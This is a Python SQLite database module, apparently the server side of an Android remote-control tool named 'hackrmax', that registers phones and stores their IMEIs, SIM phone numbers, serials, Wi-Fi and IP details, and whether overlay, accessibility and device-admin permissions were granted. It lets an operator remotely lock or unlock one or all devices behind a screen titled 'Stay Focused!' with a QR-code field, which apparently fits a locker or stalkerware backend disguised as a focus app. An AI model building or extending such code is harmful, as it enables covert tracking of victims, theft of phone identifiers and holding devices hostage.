import sqlite3, os, threading
from datetime import datetime

DB_FILE = "hackrmax.db"
_local = threading.local()

def get_conn():
    if not hasattr(_local, "conn") or _local.conn is None:
        _local.conn = sqlite3.connect(DB_FILE, check_same_thread=False)
        _local.conn.row_factory = sqlite3.Row
        _local.conn.execute("PRAGMA journal_mode=WAL")
        _local.conn.execute("PRAGMA synchronous=NORMAL")
        _local.conn.execute("PRAGMA cache_size=10000")
        _local.conn.execute("PRAGMA temp_store=MEMORY")
    return _local.conn

def init_db():
    conn = sqlite3.connect(DB_FILE, check_same_thread=False)
    conn.execute("PRAGMA journal_mode=WAL")
    conn.executescript("""
        CREATE TABLE IF NOT EXISTS devices (
            device_id       TEXT PRIMARY KEY,
            name            TEXT DEFAULT 'Unknown',
            locked          INTEGER DEFAULT 1,
            online          INTEGER DEFAULT 0,
            registered_at   TEXT,
            last_seen       TEXT,
            unlock_time     TEXT,

            -- Hardware
            model           TEXT DEFAULT '',
            brand           TEXT DEFAULT '',
            manufacturer    TEXT DEFAULT '',
            android_version TEXT DEFAULT '',
            sdk_version     TEXT DEFAULT '',
            fingerprint     TEXT DEFAULT '',
            serial          TEXT DEFAULT '',
            cpu_arch        TEXT DEFAULT '',
            cpu_cores       TEXT DEFAULT '',

            -- Battery
            battery         TEXT DEFAULT '',
            battery_charging INTEGER DEFAULT 0,
            battery_health  TEXT DEFAULT '',
            battery_temp    TEXT DEFAULT '',

            -- Screen
            screen_width    TEXT DEFAULT '',
            screen_height   TEXT DEFAULT '',
            screen_density  TEXT DEFAULT '',
            screen_size     TEXT DEFAULT '',

            -- RAM / Storage
            ram_total       TEXT DEFAULT '',
            ram_available   TEXT DEFAULT '',
            storage_total   TEXT DEFAULT '',
            storage_free    TEXT DEFAULT '',
            sd_total        TEXT DEFAULT '',
            sd_free         TEXT DEFAULT '',

            -- SIM 1
            sim1_operator   TEXT DEFAULT '',
            sim1_number     TEXT DEFAULT '',
            sim1_country    TEXT DEFAULT '',
            sim1_imei       TEXT DEFAULT '',
            sim1_network    TEXT DEFAULT '',
            sim1_signal     TEXT DEFAULT '',

            -- SIM 2
            sim2_operator   TEXT DEFAULT '',
            sim2_number     TEXT DEFAULT '',
            sim2_country    TEXT DEFAULT '',
            sim2_imei       TEXT DEFAULT '',
            sim2_network    TEXT DEFAULT '',
            sim2_signal     TEXT DEFAULT '',

            -- Network
            wifi_ssid       TEXT DEFAULT '',
            wifi_bssid      TEXT DEFAULT '',
            wifi_signal     TEXT DEFAULT '',
            ip_address      TEXT DEFAULT '',
            public_ip       TEXT DEFAULT '',
            network_type    TEXT DEFAULT '',
            mobile_data     INTEGER DEFAULT 0,

            -- Identity
            android_id      TEXT DEFAULT '',
            package_name    TEXT DEFAULT '',
            app_version     TEXT DEFAULT '',

            -- Location/Locale
            timezone        TEXT DEFAULT '',
            language        TEXT DEFAULT '',
            country         TEXT DEFAULT '',

            -- Security Status
            perm_overlay    INTEGER DEFAULT 0,
            perm_accessibility INTEGER DEFAULT 0,
            perm_admin      INTEGER DEFAULT 0,
            perm_battery    INTEGER DEFAULT 0
        );

        CREATE TABLE IF NOT EXISTS settings (
            key   TEXT PRIMARY KEY,
            value TEXT DEFAULT ''
        );

        CREATE TABLE IF NOT EXISTS logs (
            id         INTEGER PRIMARY KEY AUTOINCREMENT,
            device_id  TEXT,
            action     TEXT,
            detail     TEXT DEFAULT '',
            timestamp  TEXT
        );

        CREATE INDEX IF NOT EXISTS idx_logs_device ON logs(device_id);
        CREATE INDEX IF NOT EXISTS idx_logs_time ON logs(timestamp);
        CREATE INDEX IF NOT EXISTS idx_devices_online ON devices(online);
    """)

    # Default settings
    defaults = [
        ("title",     "Stay Focused!"),
        ("subtitle",  "Deep work mode active"),
        ("qr_url",    ""),
        ("btn1_text", "UNLOCK"),
        ("btn2_text", "Contact Admin"),
        ("btn2_url",  ""),
    ]
    for k, v in defaults:
        conn.execute(
            "INSERT OR IGNORE INTO settings(key,value) VALUES(?,?)", (k, v))
    conn.commit()
    conn.close()

def now():
    return datetime.now().strftime("%Y-%m-%d %H:%M:%S")

# ── DEVICE ──────────────────────────────────────────────
def upsert_device(d: dict):
    conn = get_conn()
    existing = conn.execute(
        "SELECT device_id, registered_at FROM devices WHERE device_id=?",
        (d["device_id"],)).fetchone()

    if not existing:
        conn.execute("""
            INSERT INTO devices (
                device_id, name, locked, online, registered_at, last_seen,
                model, brand, manufacturer, android_version, sdk_version,
                fingerprint, serial, cpu_arch, cpu_cores,
                battery, battery_charging, battery_health, battery_temp,
                screen_width, screen_height, screen_density, screen_size,
                ram_total, ram_available, storage_total, storage_free,
                sd_total, sd_free,
                sim1_operator, sim1_number, sim1_country, sim1_imei, sim1_network, sim1_signal,
                sim2_operator, sim2_number, sim2_country, sim2_imei, sim2_network, sim2_signal,
                wifi_ssid, wifi_bssid, wifi_signal, ip_address, public_ip,
                network_type, mobile_data,
                android_id, package_name, app_version,
                timezone, language, country,
                perm_overlay, perm_accessibility, perm_admin, perm_battery
            ) VALUES (
                :device_id,:name,1,1,:registered_at,:last_seen,
                :model,:brand,:manufacturer,:android_version,:sdk_version,
                :fingerprint,:serial,:cpu_arch,:cpu_cores,
                :battery,:battery_charging,:battery_health,:battery_temp,
                :screen_width,:screen_height,:screen_density,:screen_size,
                :ram_total,:ram_available,:storage_total,:storage_free,
                :sd_total,:sd_free,
                :sim1_operator,:sim1_number,:sim1_country,:sim1_imei,:sim1_network,:sim1_signal,
                :sim2_operator,:sim2_number,:sim2_country,:sim2_imei,:sim2_network,:sim2_signal,
                :wifi_ssid,:wifi_bssid,:wifi_signal,:ip_address,:public_ip,
                :network_type,:mobile_data,
                :android_id,:package_name,:app_version,
                :timezone,:language,:country,
                :perm_overlay,:perm_accessibility,:perm_admin,:perm_battery
            )""", {**_defaults(), **d,
                   "registered_at": now(), "last_seen": now()})
        add_log(d["device_id"], "REGISTERED", d.get("model",""))
    else:
        conn.execute("""
            UPDATE devices SET
                last_seen=:last_seen, online=1,
                name=:name, model=:model, brand=:brand,
                manufacturer=:manufacturer, android_version=:android_version,
                sdk_version=:sdk_version, fingerprint=:fingerprint,
                serial=:serial, cpu_arch=:cpu_arch, cpu_cores=:cpu_cores,
                battery=:battery, battery_charging=:battery_charging,
                battery_health=:battery_health, battery_temp=:battery_temp,
                screen_width=:screen_width, screen_height=:screen_height,
                screen_density=:screen_density, screen_size=:screen_size,
                ram_total=:ram_total, ram_available=:ram_available,
                storage_total=:storage_total, storage_free=:storage_free,
                sd_total=:sd_total, sd_free=:sd_free,
                sim1_operator=:sim1_operator, sim1_number=:sim1_number,
                sim1_country=:sim1_country, sim1_imei=:sim1_imei,
                sim1_network=:sim1_network, sim1_signal=:sim1_signal,
                sim2_operator=:sim2_operator, sim2_number=:sim2_number,
                sim2_country=:sim2_country, sim2_imei=:sim2_imei,
                sim2_network=:sim2_network, sim2_signal=:sim2_signal,
                wifi_ssid=:wifi_ssid, wifi_bssid=:wifi_bssid,
                wifi_signal=:wifi_signal, ip_address=:ip_address,
                public_ip=:public_ip, network_type=:network_type,
                mobile_data=:mobile_data, android_id=:android_id,
                package_name=:package_name, app_version=:app_version,
                timezone=:timezone, language=:language, country=:country,
                perm_overlay=:perm_overlay, perm_accessibility=:perm_accessibility,
                perm_admin=:perm_admin, perm_battery=:perm_battery
            WHERE device_id=:device_id
        """, {**_defaults(), **d, "last_seen": now()})
    conn.commit()

def _defaults():
    return {
        "name":"","model":"","brand":"","manufacturer":"",
        "android_version":"","sdk_version":"","fingerprint":"",
        "serial":"","cpu_arch":"","cpu_cores":"",
        "battery":"","battery_charging":0,"battery_health":"","battery_temp":"",
        "screen_width":"","screen_height":"","screen_density":"","screen_size":"",
        "ram_total":"","ram_available":"","storage_total":"","storage_free":"",
        "sd_total":"","sd_free":"",
        "sim1_operator":"","sim1_number":"","sim1_country":"",
        "sim1_imei":"","sim1_network":"","sim1_signal":"",
        "sim2_operator":"","sim2_number":"","sim2_country":"",
        "sim2_imei":"","sim2_network":"","sim2_signal":"",
        "wifi_ssid":"","wifi_bssid":"","wifi_signal":"",
        "ip_address":"","public_ip":"","network_type":"","mobile_data":0,
        "android_id":"","package_name":"","app_version":"",
        "timezone":"","language":"","country":"",
        "perm_overlay":0,"perm_accessibility":0,"perm_admin":0,"perm_battery":0
    }

def get_device(did):
    return get_conn().execute(
        "SELECT * FROM devices WHERE device_id=?", (did,)).fetchone()

def get_all_devices():
    return get_conn().execute(
        "SELECT * FROM devices ORDER BY last_seen DESC").fetchall()

def set_locked(did, locked, log=True):
    conn = get_conn()
    conn.execute("UPDATE devices SET locked=? WHERE device_id=?",
                 (1 if locked else 0, did))
    if not locked:
        conn.execute("UPDATE devices SET unlock_time=NULL WHERE device_id=?", (did,))
    conn.commit()
    if log:
        add_log(did, "LOCKED" if locked else "UNLOCKED")

def set_all_locked(locked):
    conn = get_conn()
    conn.execute("UPDATE devices SET locked=?", (1 if locked else 0,))
    if not locked:
        conn.execute("UPDATE devices SET unlock_time=NULL")
    conn.commit()
    action = "BULK_LOCK" if locked else "BULK_UNLOCK"
    add_log("ALL", action)

def set_unlock_time(did, ut):
    conn = get_conn()
    conn.execute("UPDATE devices SET unlock_time=? WHERE device_id=?", (ut, did))
    conn.commit()

def ping_device(did, data: dict):
    conn = get_conn()
    conn.execute("""
        UPDATE devices SET
            last_seen=?, online=1,
            battery=?, battery_charging=?,
            wifi_ssid=?, network_type=?,
            ip_address=?, sim1_signal=?, sim2_signal=?,
            perm_overlay=?, perm_accessibility=?, perm_admin=?, perm_battery=?
        WHERE device_id=?
    """, (now(),
          data.get("battery",""), data.get("battery_charging",0),
          data.get("wifi_ssid",""), data.get("network_type",""),
          data.get("ip_address",""),
          data.get("sim1_signal",""), data.get("sim2_signal",""),
          data.get("perm_overlay",0), data.get("perm_accessibility",0),
          data.get("perm_admin",0), data.get("perm_battery",0),
          did))
    conn.commit()

def mark_offline():
    """Mark devices offline if no ping in 90 seconds."""
    conn = get_conn()
    conn.execute("""
        UPDATE devices SET online=0
        WHERE last_seen < datetime('now','-90 seconds')
        AND online=1
    """)
    conn.commit()

# ── SETTINGS ────────────────────────────────────────────
def get_settings():
    rows = get_conn().execute("SELECT key,value FROM settings").fetchall()
    return {r["key"]: r["value"] for r in rows}

def save_settings(data: dict):
    conn = get_conn()
    for k, v in data.items():
        conn.execute("INSERT OR REPLACE INTO settings(key,value) VALUES(?,?)", (k,v))
    conn.commit()

# ── LOGS ────────────────────────────────────────────────
def add_log(device_id, action, detail=""):
    conn = get_conn()
    conn.execute(
        "INSERT INTO logs(device_id,action,detail,timestamp) VALUES(?,?,?,?)",
        (device_id, action, detail, now()))
    conn.commit()

def get_logs(limit=200):
    return get_conn().execute(
        "SELECT * FROM logs ORDER BY id DESC LIMIT ?", (limit,)).fetchall()

def get_device_logs(did, limit=50):
    return get_conn().execute(
        "SELECT * FROM logs WHERE device_id=? ORDER BY id DESC LIMIT ?",
        (did, limit)).fetchall()
